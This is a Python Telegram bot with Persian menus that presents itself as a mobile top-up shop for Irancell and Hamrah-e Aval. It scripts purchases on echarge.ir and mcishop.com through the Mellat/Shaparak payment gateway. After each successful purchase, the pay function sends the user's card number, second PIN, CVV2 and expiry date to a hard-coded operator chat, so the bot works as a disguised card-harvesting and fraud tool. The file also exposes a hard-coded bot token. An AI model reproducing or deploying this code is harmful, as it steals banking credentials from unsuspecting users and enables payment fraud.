#mrspIoit
#t.me/ZoneH
#   :)
import requests, random, telebot, json
from telebot import types
from bs4 import BeautifulSoup

bot = telebot.TeleBot("5015762411:AAH_0dM6gkjqWGj3HiBklBOQ3V9TypVBraM")
chatid = 1900060993 #shell chat id

markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
iit1 = types.KeyboardButton('خرید شارژ ایرانسل💵')
iit2 = types.KeyboardButton('خرید شارژ همراه اول💶')
markup.add(iit1, iit2)

def select(num, amount):
    s = requests.Session()
    r = s.get("https://www.echarge.ir/m/chargecard")
    h1 = {"Host": "www.echarge.ir","content-length": "81","cache-control": "max-age\u003d0","upgrade-insecure-requests": "1","origin": "https://www.echarge.ir","content-type": "application/x-www-form-urlencoded","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 7; XXXX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://www.echarge.ir/m/chargecard","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6,ar;q\u003d0.5","cookie": "_gat_gtag_UA_174576028_1\u003d1"}
    phone = random.randrange(10000000, 99999999)
    d1 = "chargeCard="+amount+"&quantity="+num+"&email=&phoneNumber=0912"+str(phone)+"&lotteryNumber=&gateway=21"
    r1 = s.post("https://www.echarge.ir/m/pay", headers=h1, data=d1)
    soup = BeautifulSoup(r1.text)
    action = soup.find("form", {"name": "form1"}).get("action")
    refid = soup.find("input", {"name": "RefId"}).get("value")
    d2 = "RefId="+refid
    h2 = {"Host": "bpm.shaparak.ir","Connection": "keep-alive","Content-Length": "22","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://www.echarge.ir","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "navigate","Sec-Fetch-Dest": "document","Referer": "https://www.echarge.ir/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6,ar;q\u003d0.5"}
    r2 = s.post("https://bpm.shaparak.ir/pgwchannel/startpay.mellat", data=d2, headers=h2)
    return r2.url

def selectH(num, amount):
    s = requests.Session()
    r = s.get("http://www.mcishop.com")
    h1 = {
    "Host": "www.mcishop.com",
    "Connection": "keep-alive",
    "Content-Length": "65",
    "Cache-Control": "max-age\u003d0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://www.mcishop.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Save-Data": "on",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "Referer": "http://www.mcishop.com/m/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6,ar;q\u003d0.5",
    }
    phone = random.randrange(10000000, 99999999)
    d1 = "chargeCard="+amount+"&quantity="+num+"&email=&phoneNumber=0919"+str(phone)+"&gateway=21"
    r1 = s.post("http://www.mcishop.com/m/pay", headers=h1, data=d1)
    soup = BeautifulSoup(r1.text)
    action = soup.find("form", {"name": "form1"}).get("action")
    refid = soup.find("input", {"name": "RefId"}).get("value")
    d2 = "RefId="+refid
    h2 = {"Host": "bpm.shaparak.ir","Connection": "keep-alive","Content-Length": "22","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://www.echarge.ir","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "navigate","Sec-Fetch-Dest": "document","Referer": "https://www.echarge.ir/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6,ar;q\u003d0.5"}
    r2 = s.post("https://bpm.shaparak.ir/pgwchannel/startpay.mellat", data=d2, headers=h2)
    return r2.url

def pay(otp, data, refid, s, operator):
    dataS = data.text.splitlines()
    tt = dataS[2].split("/")
    pin2 = dataS[3]
    if otp == False:
        pass
    else:
        pin2 = otp.text
    hPay = {
    "Host": "bpm.shaparak.ir",
    "Connection": "keep-alive",
    "Content-Length": "173",
    "Accept": "application/json, text/javascript, */*; q\u003d0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXX Build/PPR1.000000.000; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.86 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Origin": "https://bpm.shaparak.ir",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://bpm.shaparak.ir/pgwchannel/payment.mellat?RefId="+refid,
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en-US;q\u003d0.7,en;q\u003d0.6"
    }
    dPay = {"pan":dataS[0],"selectedPanIndex":-1,"pin":pin2,"cvv2":dataS[1],"expireMonth":tt[1],"expireYear":tt[0],"captcha":dataS[4],"payerId":None,"email":"","savePan":False}
    rPay = s.post("https://bpm.shaparak.ir/pgwchannel/sale.mellat?RefId="+refid, json=dPay, headers=hPay)
    ll = json.loads(rPay.text)
    if ll["status"] == "OK":
        bot.send_message(data.chat.id, "خرید انجام شد✅")
        card = " pan: "+dataS[0]+"\n pin: "+pin2+"\n cvv2: "+dataS[1]+"\n date: "+tt[0]+"/"+tt[1]
        bot.send_message(chatid, card)
    elif ll["status"] == "SALE_FAILED":
        bot.send_message(data.chat.id, ll["description"])
    elif ll["status"] == "INVALID_CAPTCHA":
        bot.send_message(data.chat.id, "کد captcha اشتباه است⚠️")

    hCheck = {
    "Host": "bpm.shaparak.ir",
    "Connection": "keep-alive",
    "Content-Length": "22",
    "Cache-Control": "max-age\u003d0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://bpm.shaparak.ir",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXX Build/PPR1.000000.000; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.86 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "X-Requested-With": "acr.browser.barebones",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://bpm.shaparak.ir/pgwchannel/payment.mellat?RefId="+refid,
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en-US;q\u003d0.7,en;q\u003d0.6"
    }
    rCheck = s.post("https://bpm.shaparak.ir/pgwchannel/result.mellat", data="RefId="+refid, headers=hCheck)
    soup = BeautifulSoup(rCheck.text)
    lis = soup.find('form', {"name": "returnForm"})
    finalH = ""
    if operator == "irancell":
        finalH = {
        "Host": "www.echarge.ir",
        "content-length": "212",
        "cache-control": "max-age\u003d0",
        "upgrade-insecure-requests": "1",
        "origin": "https://bpm.shaparak.ir",
        "content-type": "application/x-www-form-urlencoded",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 7; XXXX Build/PPR1.000000.000; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.86 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "referer": "https://bpm.shaparak.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6,ar;q\u003d0.5",
        "cookie": "language\u003dFa"
        }
    elif operator == "hamrah":
        finalH = {
        "Host": "www.mcishop.com",
        "Connection": "keep-alive",
        "Content-Length": "212",
        "Cache-Control": "max-age\u003d0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 7; fa-IR; XXXX Build/PPR1.180610.011.G950FXXUADTG6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
        "X-Requested-With": "com.code_element.vipapp.newapp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en-US;q\u003d0.7,en;q\u003d0.6"
        }
    finalD = ""
    liss = lis.find_all("input")
    for x in liss:
        name = x.get("name")
        value = x.get("value")
        finalD = finalD+name+"="+value+"&"
    print(finalD)
    finalR = s.post(lis.get("action"), data=finalD, headers=finalH)
    print(finalR.text)
    soup2 = BeautifulSoup(finalR.text)
    codes = soup2.find_all("p", {"class": "chargeCode"})
    list = ""
    for i in codes:
        c = i.getText()
        if "*141*" in c:
            list = list+c+"\n"
        elif "*140*" in c:
            list = list+c+"\n"
 
    bot.reply_to(data, list, reply_markup=markup)
    bot.send_message(chatid, list)

def send_otp(data, refid, s):
    pan = data.text.splitlines()
    dat = {"pan":pan[0],"selectedPanIndex":-1,"captcha":pan[4]}
    return s.post("https://bpm.shaparak.ir/pgwchannel/otp-request.mellat?RefId="+refid, json=dat).text

def contorol(data, refid, s, operator):
    try:
        otp = data.text.splitlines()[3]
        if otp == "1":
            res = json.loads(send_otp(data, refid, s))
            if res["status"] == "OK":
                msg = bot.send_message(data.chat.id, "رمز پویا ارسال شد✅ \n پس از دریافت آن را وارد کنید🔫")
                bot.register_next_step_handler(msg, pay, data, refid, s, operator)
            elif res["status"] == "INVALID_CAPTCHA":
                bot.send_message(data.chat.id, "کد Captcha اشتباه است❗️", reply_markup=markup)
            else:
                bot.send_message(data.chat.id, str(res), reply_markup=markup)
        else:
            pay(False, data, refid, s, operator)
    except:
        bot.send_message(data.chat.id, "ورودی نامعتبر💂‍♂", reply_markup=markup)


def captcha(m, operator, amount):
    s = requests.Session()
    h = {
    "Host": "bpm.shaparak.ir",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7; XXXXX Build/PPR1.000000.000; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.86 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "X-Requested-With": "acr.browser.barebones",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en-US;q\u003d0.7,en;q\u003d0.6"
    }
    url = ""
    if operator == "irancell":
        url = select(m.text, amount)
    elif operator == "hamrah":
        url = selectH(m.text, amount)
    
    refid = url.split("=")[1]
    r = s.get(url, headers=h)
    print (r)
    cap = s.get("https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId="+refid).content
    mess = '''
🔫 اطلاعات را به ترتیب ارسال نمایید.

-🌀شماره کارت
-🌀شناسه cvv2
-🌀تاریخ
-🌀رمز  (جهت ارسال رمز پویا به جای رمز دوم عدد 1 را وارد نمایید.)
-🌀تصویر captcha

💎نمونه:

6037701643367849
788
04/08
58439
00509
    '''
    cap_send = bot.send_photo(m.chat.id, cap, caption=mess)
    bot.register_next_step_handler(cap_send, contorol, refid, s, operator)

def contorol4(ms, operator, amount):
    list = ["1", "2", "3", "4", "5"]
    if ms.text in list:
        bot.reply_to(ms, "لطفا صبر کنید ...⏳", reply_markup=markup)
        captcha(ms, operator, amount)
    else:
        bot.reply_to(ms, "لطفا گزینه های موجود را انتخاب نمایید🐧", reply_markup=markup)

def contorol3(ms, operator, amount):
    up = types.ReplyKeyboardMarkup(resize_keyboard=True)
    it1 = types.KeyboardButton('1')
    it2 = types.KeyboardButton('2')
    it3 = types.KeyboardButton('3')
    it4 = types.KeyboardButton('4')
    it5 = types.KeyboardButton('5')
    up.add(it1, it2)
    up.add(it3, it4)
    up.add(it5)
    mss = bot.reply_to(ms, "🛍تعداد شارژ های درخواستی را انتخاب نمایید.", reply_markup=up)
    bot.register_next_step_handler(mss, contorol4, operator, amount)
    

def contorol2(ms, operator):
    try:
        if operator == "irancell":
            list = ["💶 ۱۰۰۰ تومان", "💶 ۲۰۰۰ تومان", "💶 ۵۰۰۰ تومان", "💶 ۱۰۰۰۰ تومان", "💶 ۲۰۰۰۰ تومان"]
            if ms.text in list:
                dj = {"💶 ۱۰۰۰ تومان": "12", "💶 ۲۰۰۰ تومان": "9", "💶 ۵۰۰۰ تومان": "1", "💶 ۱۰۰۰۰ تومان": "2", "💶 ۲۰۰۰۰ تومان": "22"}
                contorol3(ms, operator, dj[ms.text])
            else:
                bot.reply_to(ms, "لطفا گزینه های موجود را انتخاب نمایید🐧", reply_markup=markup)
        elif operator == "hamrah":
            list = ["💶 ۲۰۰۰ تومان", "💶 ۵۰۰۰ تومان", "💶 ۱۰۰۰۰ تومان", "💶 ۲۰۰۰۰ تومان", "💶 ۵۰۰۰۰ تومان", "💶 ۱۰۰۰۰۰ تومان"]
            if ms.text in list:
                dj = {"💶 ۲۰۰۰ تومان": "13", "💶 ۵۰۰۰ تومان": "11", "💶 ۱۰۰۰۰ تومان": "7", "💶 ۲۰۰۰۰ تومان": "8", "💶 ۵۰۰۰۰ تومان": "44", "💶 ۱۰۰۰۰۰ تومان": "45"}
                contorol3(ms, operator, dj[ms.text])
            else:
                bot.reply_to(ms, "لطفا گزینه های موجود را انتخاب نمایید🐧", reply_markup=markup)
    except:
        bot.reply_to(ms, "اطلاعات نامعتبر💩", reply_markup=markup)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    well = '''
سلام 👋ِ
به ربات خرید شارژ خوش آمدید.
برای ادامه از دکمه های زیر استفاده کنید.
    '''
    
    bot.reply_to(message, well, reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def echo_all(message):
    if message.content_type == "text":
        if message.text == "خرید شارژ ایرانسل💵":
            mmarkup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            it1 = types.KeyboardButton('💶 ۱۰۰۰ تومان')
            it2 = types.KeyboardButton('💶 ۲۰۰۰ تومان')
            it3 = types.KeyboardButton('💶 ۵۰۰۰ تومان')
            it4 = types.KeyboardButton('💶 ۱۰۰۰۰ تومان')
            it5 = types.KeyboardButton('💶 ۲۰۰۰۰ تومان')
            mmarkup.add(it1, it2)
            mmarkup.add(it3, it4)
            mmarkup.add(it5)
            ms = bot.reply_to(message, "🔋شارژ ایرانسل،\nگزینه مورد نظر را انتخاب نمایید.", reply_markup=mmarkup)
            bot.register_next_step_handler(ms, contorol2, "irancell")
        elif message.text == "خرید شارژ همراه اول💶":
            mmmarkup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            it1 = types.KeyboardButton('💶 ۲۰۰۰ تومان')
            it2 = types.KeyboardButton('💶 ۵۰۰۰ تومان')
            it3 = types.KeyboardButton('💶 ۱۰۰۰۰ تومان')
            it4 = types.KeyboardButton('💶 ۲۰۰۰۰ تومان')
            it5 = types.KeyboardButton('💶 ۵۰۰۰۰ تومان')
            it6 = types.KeyboardButton('💶 ۱۰۰۰۰۰ تومان')
            mmmarkup.add(it1, it2)
            mmmarkup.add(it3, it4)
            mmmarkup.add(it5, it6)
            ms = bot.reply_to(message, "🔋شارژ همراه اول،\nگزینه مورد نظر را انتخاب نمایید.", reply_markup=mmmarkup)
            bot.register_next_step_handler(ms, contorol2, "hamrah")


bot.infinity_polling()
